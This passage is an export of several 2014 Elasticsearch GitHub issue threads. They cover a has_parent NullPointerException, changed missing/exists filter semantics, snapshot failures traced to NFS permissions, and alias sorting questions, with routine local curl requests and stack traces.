    "children": {
        "_parent": {
            "type": "parents"
        }
    }
}
```

Mapping for type with missing parent type:

```
PUT /test/children2/_mapping
{
    "children2": {
        "_parent": {
            "type": "parents2"
        }
    }
}
```

Add something to parents (corrent one) to create mapping:

```
POST /test/parents
{
    "someField" : "someValue"
}
```

```
POST /test/children/_search
{
    "filter": {
            "has_parent": {
               "type": "parents",
               "query": {
                "query_string": {
                   "query": "*"
                }   
               }
            }
    }
}
```

Above query is gonna fail with NullPointerException without possiblity to catch a real problem (debug helps here :)),

```
org.elasticsearch.search.SearchParseException: [test][0]: from[-1],size[-1]: Parse Failure [Failed to parse source [{
    "filter": {
                "has_parent": {
                           "type": "parents",
                           "query": {
                    "query_string": {
                       "query": "*"
                    }
                           }
                        }
        }
}
]]
        at org.elasticsearch.search.SearchService.parseSource(SearchService.java:664)
        at org.elasticsearch.search.SearchService.createContext(SearchService.java:515)
        at org.elasticsearch.search.SearchService.createAndPutContext(SearchService.java:487)
        at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:256)
        at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:206)
        at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:203)
        at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:517)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
        at java.lang.Thread.run(Thread.java:744)
Caused by: java.lang.NullPointerException
        at org.elasticsearch.index.query.HasParentFilterParser.parse(HasParentFilterParser.java:158)
        at org.elasticsearch.index.query.QueryParseContext.executeFilterParser(QueryParseContext.java:290)
        at org.elasticsearch.index.query.QueryParseContext.parseInnerFilter(QueryParseContext.java:271)
        at org.elasticsearch.index.query.IndexQueryParserService.parseInnerFilter(IndexQueryParserService.java:282)
        at org.elasticsearch.search.query.PostFilterParseElement.parse(PostFilterParseElement.java:33)
        at org.elasticsearch.search.SearchService.parseSource(SearchService.java:648)
        ... 9 more
```

Btw. Query on incorrect type (children2) fails fine since it throws:

```
[test] [has_parent] filter configured 'parent_type' [parents2] is not a valid type];
```
</description><key id="40692493">7349</key><summary>[ES 1.3.2] NullPointerException while parsing hasParent query/filter</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/martijnvg/following{/other_user}', u'events_url': u'https://api.github.com/users/martijnvg/events{/privacy}', u'organizations_url': u'https://api.github.com/users/martijnvg/orgs', u'url': u'https://api.github.com/users/martijnvg', u'gists_url': u'https://api.github.com/users/martijnvg/gists{/gist_id}', u'html_url': u'https://github.com/martijnvg', u'subscriptions_url': u'https://api.github.com/users/martijnvg/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/580421?v=4', u'repos_url': u'https://api.github.com/users/martijnvg/repos', u'received_events_url': u'https://api.github.com/users/martijnvg/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/martijnvg/starred{/owner}{/repo}', u'site_admin': False, u'login': u'martijnvg', u'type': u'User', u'id': 580421, u'followers_url': u'https://api.github.com/users/martijnvg/followers'}</assignee><reporter username="">scoro</reporter><labels><label>bug</label></labels><created>2014-08-20T12:21:09Z</created><updated>2014-08-27T07:03:11Z</updated><resolved>2014-08-27T07:03:11Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="martijnvg" created="2014-08-21T07:36:52Z" id="52887840">@scoro Thanks for reporting this! I opened #7362 for this bug.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Search result changed since 1.24 (current 1.3.2)</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7348</link><project id="" key="" /><description>Heya,

in ES 1.2.4 i do something like this:

``` bash
curl -XPUT 'http://localhost:9200/twitter/user/kimchy' -d '{ "name_test" : "Shay Banon" }'
curl -XPUT 'http://localhost:9200/twitter/user/foo' -d '{ "name_test" : "" }'
curl -XPOST 'http://localhost:9200/_search' -d '{"query":{"filtered":{"filter":{"and":{"filters":[{"missing":{"field": "name_test"}}]}}}}}'
```

Filter in "nice view"

``` json
{
  "query": {
    "filtered": {
      "filter": {
        "and": {
          "filters": [
            {
              "missing": {
                "field": "name_test"
              }
            }
          ]
        }
      }
    }
  }
}
```

This one gives 1 hit.

In Version 1.3.2 i do the same stuff, but got 0 hits.

Am I missing something? (I read the changelog, but didnt find something that could possible do this...) 

That happens, as i may suggest, when the field name got an underscore.
Tested it with "name" then it will also give one hit.

Thanks for watchin.

Dominik
</description><key id="40686298">7348</key><summary>Search result changed since 1.24 (current 1.3.2)</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">dominikmank</reporter><labels><label>docs</label></labels><created>2014-08-20T11:12:14Z</created><updated>2015-03-01T19:42:18Z</updated><resolved>2014-11-08T16:08:31Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-20T13:02:20Z" id="52774244">@dominikmank The way that `missing` and `exists` is implemented changed in 1.3.0, see https://github.com/elasticsearch/elasticsearch/issues/5659

If I understand what is happening correctly, the difference happens on analyzed fields that generate no tokens. In that case the old implementation assumed that the field didn't exist while the new implementation assumes that it exists since a field value was provided. I'm wondering that the new approach may be more correct?
</comment><comment author="clintongormley" created="2014-08-20T13:24:04Z" id="52776917">@jpountz it's breaking bwc.  i think people probably rely on the old behaviour.
</comment><comment author="jpountz" created="2014-08-20T13:33:27Z" id="52778103">I guess it could be considered a bug fix as well since the documentation mentions it is supposed to find fields that have no values while `""`, `"_"`, or any other value whose analyzed form contains no tokens is still a valid value?

If we want to maintain bwc, I guess we can revert the change to the `missing` and `exists` filters in 1.x (but they'll be slow again) and document this break for 2.0.
</comment><comment author="dominikmank" created="2014-08-20T13:48:03Z" id="52780004">@clintongormley yep, i'm relying on it - but if there's another way to do it, i would love to see the solution.

@jpountz So it's because the field is on default analyzed - yes? 
Can you show me an alternative with your changes in my example? 

We reverted back to 1.2.4 now, so it's not that urgent :-) 
</comment><comment author="jpountz" created="2014-08-20T13:54:05Z" id="52780812">&gt;  So it's because the field is on default analyzed - yes?

Yes.

It should be possible to emulate the old behavior by doing a query like this one, just replace `f` with the field name that you want to check:

```
GET test/_search
{
  "query": {
    "filtered": {
      "filter": {
        "not": {
          "filter": {
            "range": {
              "f": {
              }
            }
          }
        }
      }
    }
  }
}
```

`exists` should be the same without the `not` filter.
</comment><comment author="dominikmank" created="2014-08-20T13:59:51Z" id="52781645">@jpountz yeah, that solves it, thanks! ... but we take the 1.2.4 anyway for the time being :D So, this is the method to do it in the future? :'( 
</comment><comment author="jpountz" created="2014-08-20T14:27:37Z" id="52785464">@dominikmank I don't know yet. This way of computing documents with missing values is very costly and this was the reason for the refactoring in #5659. I don't think we can get back to the old behavior with the new impl whithout analyzing twice, which I'd like to avoid. Let's see what @clintongormley thinks about it.
</comment><comment author="jprante" created="2014-09-01T11:50:42Z" id="54050591">I like the new behavior of #5659 because it is faster and I have high cardinality fields all over the place, and suggest to add the missing documentation of the breaking change in one of the subsequent version release notes.  My 2&#162;
</comment><comment author="LesBarstow" created="2014-09-09T23:48:38Z" id="55053335">While I like the idea of increased speed, this change does require (perhaps significant) extra client-side massaging when inserting variable data that might include empty strings.

The change is also not properly documented in the missing filter documentation or anywhere else that I've been able to find that references null value processing.
</comment><comment author="clintongormley" created="2014-11-08T16:08:31Z" id="62263074">I have clarified the behaviour of the `missing` and `exists` filters in b9149f836b61382446f8d14feb05cde5810602e8
</comment><comment author="salimane" created="2015-03-01T19:42:18Z" id="76626305">@jpountz the query you provided, on 1.4.4, works for type string but does not work for empty type objects like `{ "user": [] }`.
Basically i would love a sample query that works for : 

``` ruby
{ "user": null }
{ "user": [] } 
{ "user": [null] } 
{ "foo":  "bar" } 
{ "user":  "" } 
{ "user":  "a and to" }  # only stopwords that would be cleaned up with an analyzer like stop
```

All the above should match the query:

``` ruby
{
        "filter" : {
            "missing" : { "field" : "user" }
        }
}
```

Any ideas ?
Thanks
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Empty bool {} should return match_all</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7347</link><project id="" key="" /><description>This also fixes has_parent filters with a nested empty bool filter
(see test SimpleChildQuerySearchTests#test6722, the test should actually expect
either 0 results when searching for has_parent "test" or one result when
search for has_parent "foo")

closes #7240
</description><key id="40677247">7347</key><summary>Empty bool {} should return match_all</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/brwe/following{/other_user}', u'events_url': u'https://api.github.com/users/brwe/events{/privacy}', u'organizations_url': u'https://api.github.com/users/brwe/orgs', u'url': u'https://api.github.com/users/brwe', u'gists_url': u'https://api.github.com/users/brwe/gists{/gist_id}', u'html_url': u'https://github.com/brwe', u'subscriptions_url': u'https://api.github.com/users/brwe/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/4320215?v=4', u'repos_url': u'https://api.github.com/users/brwe/repos', u'received_events_url': u'https://api.github.com/users/brwe/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/brwe/starred{/owner}{/repo}', u'site_admin': False, u'login': u'brwe', u'type': u'User', u'id': 4320215, u'followers_url': u'https://api.github.com/users/brwe/followers'}</assignee><reporter username="">brwe</reporter><labels><label>:Query DSL</label><label>bug</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-20T09:16:02Z</created><updated>2015-06-07T19:05:13Z</updated><resolved>2014-08-27T12:08:21Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="rjernst" created="2014-08-21T07:30:30Z" id="52887337">LGTM. Just a couple minor comments.
</comment><comment author="brwe" created="2014-08-21T14:11:15Z" id="52924897">Thanks for the review! Updated with commits to adress the comments.
</comment><comment author="rjernst" created="2014-08-22T05:55:06Z" id="53025827">LGTM.  A couple more cosmetic naming comments.
</comment><comment author="brwe" created="2014-08-26T10:28:46Z" id="53401608">Renamed the tests. 
</comment><comment author="rjernst" created="2014-08-26T14:49:02Z" id="53432462">+1 to commit.
</comment><comment author="brwe" created="2014-08-27T09:51:57Z" id="53548424">After rebasing to master I had to fix a test, see  58735d74eca7
The type cache is actually redundant.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Upgrade to Apache HttpComponents client 4.3.5</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7346</link><project id="" key="" /><description>Closes #7342
</description><key id="40673726">7346</key><summary>Upgrade to Apache HttpComponents client 4.3.5</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">spinscale</reporter><labels><label>:Network</label><label>upgrade</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-20T08:26:49Z</created><updated>2015-08-25T13:25:43Z</updated><resolved>2014-08-22T07:45:30Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-08-21T08:07:14Z" id="52890285">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Why the mappings in rails is replaced by default setting</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7345</link><project id="" key="" /><description>I use elasticsearch in my rails application. The following are my settings and mappings:

```
settings index: { number_of_shards: 5 }, analysis: { analyzer: 'ik' } do
    mappings dynamic: 'strict' do
      indexes :title, analyzer: 'ik', type: :string
      indexes :content, analyzer: 'ik', type: :string
      indexes :likes_count, type: :integer
      indexes :tags do
        indexes :name, analyzer: 'ik', type: :string
      end
    end
  end
```

When I use `Note.import` to build index for my  data, I just found the settings and mappings in elasticsearch using the default configuration. 

```
curl -XGET localhost:9200/collections/collection/_mapping?pretty 
{
  "collections" : {
    "mappings" : {
      "collection" : {
        "properties" : {
          "content" : {
            "type" : "string"
          },
          "created_at" : {
            "type" : "date",
            "format" : "dateOptionalTime"
          },
          "id" : {
            "type" : "long"
          },
          "image_content_type" : {
            "type" : "string"
          },
          "image_file_name" : {
            "type" : "string"
          },
          "image_file_size" : {
            "type" : "long"
          },
          "image_updated_at" : {
            "type" : "date",
            "format" : "dateOptionalTime"
          },
          "likes_count" : {
            "type" : "long"
          },
          "newly_added_at" : {
            "type" : "long"
          },
          "priority" : {
            "type" : "long"
          },
          "recommended" : {
            "type" : "boolean"
          },
          "slug" : {
            "type" : "string"
          },
          "tags" : {
            "properties" : {
              "name" : {
                "type" : "string"
              }
            }
          },
          "title" : {
            "type" : "string"
          },
          "updated_at" : {
            "type" : "date",
            "format" : "dateOptionalTime"
          },
          "user_id" : {
            "type" : "long"
          },
          "visible" : {
            "type" : "boolean"
          }
        }
      }
    }
  }
}
```

They all use a default setting and mapping configuration.  I have tried a lot but fail to deal with it. Could somebody shed some light on this problem?
</description><key id="40669769">7345</key><summary>Why the mappings in rails is replaced by default setting</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">tigerneil</reporter><labels /><created>2014-08-20T07:20:51Z</created><updated>2014-08-20T07:34:32Z</updated><resolved>2014-08-20T07:34:32Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-20T07:34:32Z" id="52743071">Hi @tigerneil 

Please ask these questions on the rails project. This issues list is for bug reports and feature requests for elasticsearch itself.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>random FileNotFoundExceptions when performing a snapshot</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7344</link><project id="" key="" /><description>i had a 1.2.2 cluster of 6 nodes with an nfs folder on one of the servers shared between all of them
when trying to do a snapshot i'm getting exceptions like

```
CreateSnapshotResponse[snapshotInfo=SnapshotInfo[name=2014-08-11-16-31-04,state=PARTIAL,reason=&lt;null&gt;,indices=Object[][{my_idx3,my_idx2}],
startTime=1407774870154,endTime=1407775114709,totalShards=17,successfulShards=14,
shardFailures=Object[][{
[my_idx2][4] failed, reason [IndexShardSnapshotFailedException[[my_idx2][4] Failed to perform snapshot (index files)]; nested: FileNotFoundException[/home/shared_dir/indices/my_idx2/4/__0 (No such file or directory)]; ],
[my_idx2][3] failed, reason [IndexShardSnapshotFailedException[[my_idx2][3] Failed to perform snapshot (index files)]; nested: FileNotFoundException[/home/shared_dir/indices/my_idx2/3/__0 (No such file or directory)]; ],
[my_idx3][0] failed, reason [IndexShardSnapshotFailedException[[my_idx3][0] Failed to perform snapshot (index files)]; nested: FileNotFoundException[/home/shared_dir/indices/my_idx3/0/__0 (No such file or directory)]; ]}]],
headers=&lt;null&gt;,remoteAddress=inet[masternode/redacted:9300]]
```

this only happens for some shards, others are snapshotted fine and i was able to restore them succesfully
after upgrade to 1.3.1 one of the indexes did not exhibit the problem anymore but the other one continued
since the upgrade i've created a few more indexes and now i'm getting same errors for them:

```
CreateSnapshotResponse[snapshotInfo=SnapshotInfo[name=2014-08-19-00-57-20,state=PARTIAL,reason=&lt;null&gt;,indices=Object[][{my_idx3,my_idx_redacted_7,my_idx_redacted_7,my_idx_redacted_7,my_idx_redacted_7,my_idx_redacted_7,my_idx_redacted_7,my_idx_redacted_7}],startTime=1408410040861,endTime=1408410112552,totalShards=96,successfulShards=64,shardFailures=Object[][
{[my_idx_redacted_7][0] failed, reason [IndexShardSnapshotFailedException[[my_idx_redacted_7][0] Failed to perform snapshot (index files)]; nested: FileNotFoundException[/home/shared_dir/indices/my_idx_redacted_7/0/__0 (No such file or directory)]; ],
[my_idx_redacted_7][1] failed, reason [IndexShardSnapshotFailedException[[my_idx_redacted_7][1] Failed to perform snapshot (index files)]; nested: FileNotFoundException[/home/shared_dir/indices/my_idx_redacted_7/1/__0 (No such file or directory)]; ],
[my_idx_redacted_7][6] failed, reason [IndexShardSnapshotFailedException[[my_idx_redacted_7][6] Failed to perform snapshot (index files)]; nested: FileNotFoundException[/home/shared_dir/indices/my_idx_redacted_7/6/__0 (No such file or directory)]; ],
[my_idx_redacted_7][7] failed, reason [IndexShardSnapshotFailedException[[my_idx_redacted_7][7] Failed to perform snapshot (index files)]; nested: FileNotFoundException[/home/shared_dir/indices/my_idx_redacted_7/7/__0 (No such file or directory)]; ],
[my_idx_redacted_7][0] failed, reason [IndexShardSnapshotFailedException[[my_idx_redacted_7][0] Failed to perform snapshot (index files)]; nested: FileNotFoundException[/home/shared_dir/indices/my_idx_redacted_7/0/__0 (No such file or directory)]; ],
[my_idx_redacted_7][1] failed, reason [IndexShardSnapshotFailedException[[my_idx_redacted_7][1] Failed to perform snapshot (index files)]; nested: FileNotFoundException[/home/shared_dir/indices/my_idx_redacted_7/1/__0 (No such file or directory)]; ],
[my_idx_redacted_7][6] failed, reason [IndexShardSnapshotFailedException[[my_idx_redacted_7][6] Failed to perform snapshot (index files)]; nested: FileNotFoundException[/home/shared_dir/indices/my_idx_redacted_7/6/__0 (No such file or directory)]; ],
[my_idx_redacted_7][8] failed, reason [IndexShardSnapshotFailedException[[my_idx_redacted_7][8] Failed to perform snapshot (index files)]; nested: FileNotFoundException[/home/shared_dir/indices/my_idx_redacted_7/8/__0 (No such file or directory)]; ],
[my_idx_redacted_7][7] failed, reason [IndexShardSnapshotFailedException[[my_idx_redacted_7][7] Failed to perform snapshot (index files)]; nested: FileNotFoundException[/home/shared_dir/indices/my_idx_redacted_7/7/__0 (No such file or directory)]; ],
[my_idx_redacted_7][6] failed, reason [IndexShardSnapshotFailedException[[my_idx_redacted_7][6] Failed to perform snapshot (index files)]; nested: FileNotFoundException[/home/shared_dir/indices/my_idx_redacted_7/6/__0 (No such file or directory)]; ],
[my_idx_redacted_7][2] failed, reason [IndexShardSnapshotFailedException[[my_idx_redacted_7][2] Failed to perform snapshot (index files)]; nested: FileNotFoundException[/home/shared_dir/indices/my_idx_redacted_7/2/__2 (No such file or directory)]; ],
[my_idx_redacted_7][0] failed, reason [IndexShardSnapshotFailedException[[my_idx_redacted_7][0] Failed to perform snapshot (index files)]; nested: FileNotFoundException[/home/shared_dir/indices/my_idx_redacted_7/0/__0 (No such file or directory)]; ],
[my_idx_redacted_7][6] failed, reason [IndexShardSnapshotFailedException[[my_idx_redacted_7][6] Failed to perform snapshot (index files)]; nested: FileNotFoundException[/home/shared_dir/indices/my_idx_redacted_7/6/__0 (No such file or directory)]; ],
[my_idx_redacted_7][0] failed, reason [IndexShardSnapshotFailedException[[my_idx_redacted_7][0] Failed to perform snapshot (index files)]; nested: FileNotFoundException[/home/shared_dir/indices/my_idx_redacted_7/0/__0 (No such file or directory)]; ],
[my_idx_redacted_7][2] failed, reason [IndexShardSnapshotFailedException[[my_idx_redacted_7][2] Failed to perform snapshot (index files)]; nested: FileNotFoundException[/home/shared_dir/indices/my_idx_redacted_7/2/__0 (No such file or directory)]; ],
[my_idx_redacted_7][10] failed, reason [IndexShardSnapshotFailedException[[my_idx_redacted_7][10] Failed to perform snapshot (index files)]; nested: FileNotFoundException[/home/shared_dir/indices/my_idx_redacted_7/10/__2 (No such file or directory)]; ],
[my_idx_redacted_7][9] failed, reason [IndexShardSnapshotFailedException[[my_idx_redacted_7][9] Failed to perform snapshot (index files)]; nested: FileNotFoundException[/home/shared_dir/indices/my_idx_redacted_7/9/__0 (No such file or directory)]; ]
,[my_idx_redacted_7][3] failed, reason [IndexShardSnapshotFailedException[[my_idx_redacted_7][3] Failed to perform snapshot (index files)]; nested: FileNotFoundException[/home/shared_dir/indices/my_idx_redacted_7/3/__1 (No such file or directory)]; ],
[my_idx_redacted_7][0] failed, reason [IndexShardSnapshotFailedException[[my_idx_redacted_7][0] Failed to perform snapshot (index files)]; nested: FileNotFoundException[/home/shared_dir/indices/my_idx_redacted_7/0/__0 (No such file or directory)]; ],
[my_idx_redacted_7][4] failed, reason [IndexShardSnapshotFailedException[[my_idx_redacted_7][4] Failed to perform snapshot (index files)]; nested: FileNotFoundException[/home/shared_dir/indices/my_idx_redacted_7/4/__2 (No such file or directory)]; ],
[my_idx_redacted_7][8] failed, reason [IndexShardSnapshotFailedException[[my_idx_redacted_7][8] Failed to perform snapshot (index files)]; nested: FileNotFoundException[/home/shared_dir/indices/my_idx_redacted_7/8/__0 (No such file or directory)]; ],
[my_idx_redacted_7][3] failed, reason [IndexShardSnapshotFailedException[[my_idx_redacted_7][3] Failed to perform snapshot (index files)]; nested: FileNotFoundException[/home/shared_dir/indices/my_idx_redacted_7/3/__1 (No such file or directory)]; ],
[my_idx_redacted_7][4] failed, reason [IndexShardSnapshotFailedException[[my_idx_redacted_7][4] Failed to perform snapshot (index files)]; nested: FileNotFoundException[/home/shared_dir/indices/my_idx_redacted_7/4/__3 (No such file or directory)]; ],
[my_idx_redacted_7][0] failed, reason [IndexShardSnapshotFailedException[[my_idx_redacted_7][0] Failed to perform snapshot (index files)]; nested: FileNotFoundException[/home/shared_dir/indices/my_idx_redacted_7/0/__2 (No such file or directory)]; ],
[my_idx_redacted_7][8] failed, reason [IndexShardSnapshotFailedException[[my_idx_redacted_7][8] Failed to perform snapshot (index files)]; nested: FileNotFoundException[/home/shared_dir/indices/my_idx_redacted_7/8/__1 (No such file or directory)]; ],
[my_idx_redacted_7][10] failed, reason [IndexShardSnapshotFailedException[[my_idx_redacted_7][10] Failed to perform snapshot (index files)]; nested: FileNotFoundException[/home/shared_dir/indices/my_idx_redacted_7/10/__0 (No such file or directory)]; ],
[my_idx3][7] failed, reason [IndexShardSnapshotFailedException[[my_idx3][7] Failed to perform snapshot (index files)]; nested: FileNotFoundException[/home/shared_dir/indices/my_idx3/7/__0 (No such file or directory)]; ],
[my_idx3][0] failed, reason [IndexShardSnapshotFailedException[[my_idx3][0] Failed to perform snapshot (index files)]; nested: FileNotFoundException[/home/shared_dir/indices/my_idx3/0/__0 (No such file or directory)]; ],
[my_idx_redacted_7][2] failed, reason [IndexShardSnapshotFailedException[[my_idx_redacted_7][2] Failed to perform snapshot (index files)]; nested: FileNotFoundException[/home/shared_dir/indices/my_idx_redacted_7/2/__0 (No such file or directory)]; ],
[my_idx_redacted_7][0] failed, reason [IndexShardSnapshotFailedException[[my_idx_redacted_7][0] Failed to perform snapshot (index files)]; nested: FileNotFoundException[/home/shared_dir/indices/my_idx_redacted_7/0/__0 (No such file or directory)]; ],
[my_idx_redacted_7][6] failed, reason [IndexShardSnapshotFailedException[[my_idx_redacted_7][6] Failed to perform snapshot (index files)]; nested: FileNotFoundException[/home/shared_dir/indices/my_idx_redacted_7/6/__0 (No such file or directory)]; ],
[my_idx_redacted_7][8] failed, reason [IndexShardSnapshotFailedException[[my_idx_redacted_7][8] Failed to perform snapshot (index files)]; nested: FileNotFoundException[/home/shared_dir/indices/my_idx_redacted_7/8/__0 (No such file or directory)]; ]}]],
headers=&lt;null&gt;,remoteAddress=inet[redacted/redacted:9300]]
```
</description><key id="40644203">7344</key><summary>random FileNotFoundExceptions when performing a snapshot</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/imotov/following{/other_user}', u'events_url': u'https://api.github.com/users/imotov/events{/privacy}', u'organizations_url': u'https://api.github.com/users/imotov/orgs', u'url': u'https://api.github.com/users/imotov', u'gists_url': u'https://api.github.com/users/imotov/gists{/gist_id}', u'html_url': u'https://github.com/imotov', u'subscriptions_url': u'https://api.github.com/users/imotov/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/655851?v=4', u'repos_url': u'https://api.github.com/users/imotov/repos', u'received_events_url': u'https://api.github.com/users/imotov/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/imotov/starred{/owner}{/repo}', u'site_admin': False, u'login': u'imotov', u'type': u'User', u'id': 655851, u'followers_url': u'https://api.github.com/users/imotov/followers'}</assignee><reporter username="">OlegYch</reporter><labels /><created>2014-08-19T22:28:11Z</created><updated>2014-08-20T15:50:22Z</updated><resolved>2014-08-20T15:50:22Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="OlegYch" created="2014-08-19T22:31:13Z" id="52709309">CheckIndex reports no errors
</comment><comment author="imotov" created="2014-08-19T22:33:26Z" id="52709559">@OlegYch can you double check that the directory `/home/shared_dir/indices/` exists and points to the same location on all nodes?
</comment><comment author="OlegYch" created="2014-08-19T22:41:59Z" id="52710625">yep, just did and they are all there, and restore worked except for the failed shards 
</comment><comment author="imotov" created="2014-08-19T22:46:36Z" id="52711207">Can you send me logs from the node where these shards failed?
</comment><comment author="OlegYch" created="2014-08-19T23:28:16Z" id="52714709">the exceptions in the log are all like this (the full log is bloated with unrelated stuff):

```
[2014-08-19 22:57:34,967][WARN ][snapshots                ] [redacted] [[my_idx_redacted_7][10]] [prod:2014-08-19-22-55-04] failed to create snapshot
org.elasticsearch.index.snapshots.IndexShardSnapshotFailedException: [my_idx_redacted_7][10] Failed to perform snapshot (index files)
        at org.elasticsearch.index.snapshots.blobstore.BlobStoreIndexShardRepository$SnapshotContext.snapshot(BlobStoreIndexShardRepository.java:489)
        at org.elasticsearch.index.snapshots.blobstore.BlobStoreIndexShardRepository.snapshot(BlobStoreIndexShardRepository.java:131)
        at org.elasticsearch.index.snapshots.IndexShardSnapshotAndRestoreService.snapshot(IndexShardSnapshotAndRestoreService.java:86)
        at org.elasticsearch.snapshots.SnapshotsService$6.run(SnapshotsService.java:829)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
        at java.lang.Thread.run(Thread.java:744)
Caused by: java.io.FileNotFoundException: /home/shared_dir/indices/my_idx_redacted_7/10/__1 (No such file or directory)
        at java.io.RandomAccessFile.open(Native Method)
        at java.io.RandomAccessFile.&lt;init&gt;(RandomAccessFile.java:241)
        at org.elasticsearch.common.blobstore.fs.FsImmutableBlobContainer$1.run(FsImmutableBlobContainer.java:50)
        ... 3 more
```

suspiciously only two out of 6 nodes have failures and on those nodes it looks like all of shards have failed to snapshot
es and nfs have exactly the same configuration on all nodes in the cluster though, and overall the configuration is pretty much identical..
</comment><comment author="imotov" created="2014-08-19T23:45:39Z" id="52716005">If there is nothing else in the logs, the only scenario that I can think of that would lead to this failure is if during the snapshot process this nfs mount was somehow unavailable on these two nodes and it became available afterwards when you checked. Is this mount accessible to the user that elasticsearch is running under?
</comment><comment author="OlegYch" created="2014-08-20T00:16:38Z" id="52718540">indeed

```
sudo -u elasticsearch touch /home/shared_dir/hello
```

fails on those nodes with Permission denied
and 'id elasticsearch' reports different values even though ls -la reports that the directory is owned by the same user...
any idea how to make the snapshot under those circumstances ?
</comment><comment author="imotov" created="2014-08-20T00:20:25Z" id="52718931">The snapshot directory has to be writable from all data nodes that contain primary shards of the indices that are getting snapshotted. So, I think fixing the permission issue would be the way to go.
</comment><comment author="imotov" created="2014-08-20T15:50:19Z" id="52798178">Since this particular issue was caused by incorrect permission settings, I am going to close it. In general, we are planning to address the confusion that this issue caused by adding repository validation as part of #7096. It should simplify troubleshooting of issues like this. 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>sorting does not work when querying an alias</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7343</link><project id="" key="" /><description>using 1.3.1 and 1.3.2 the ordering of results differs when searching on alias vs searching on the index with actual data from that alias (only one index in the alias has any data in the type)

```
GET myindex_search/_alias
{
   "myindex_7": {
      "aliases": {
         "myindex_search": {},
         "myindex": {}
      }
   },
   "users_idx3": {
      "aliases": {
         "users_idx": {},
         "myindex_search": {},
         "users_idx_search": {},
      }
   }
}
```

```
GET myindex_search/mytype/_search
{
  "query": {
    "constant_score": {
      "filter": {
        "and": {
"filters": [
              {"term": {
                "user_id": 582313
              }}

          ]
        }
      }
    }
  },
  "sort": [
    {
      "data.start_date": {
        "order": "asc",
        "ignore_unmapped": "true"
      }
    }
  ]
,
"aggs": {
  "max": {
    "max": {
      "field": "data.order_date"
    }
  }
}, 
  "size": 110
}
```

returns

```
{
   "took": 5,
   "timed_out": false,
   "_shards": {
      "total": 20,
      "successful": 20,
      "failed": 0
   },
   "hits": {
      "total": 16,
      "max_score": null,
      "hits": [
         {
            "_index": "myindex_7",
            "_type": "mytype",
            "_id": "582313_1408441377.377091-0",
            "_score": null,
            "_source": {
               "data": {
                  "distance": 1210.14,
                  "end_date": 1408449667.817116,
                  "calories": 0,
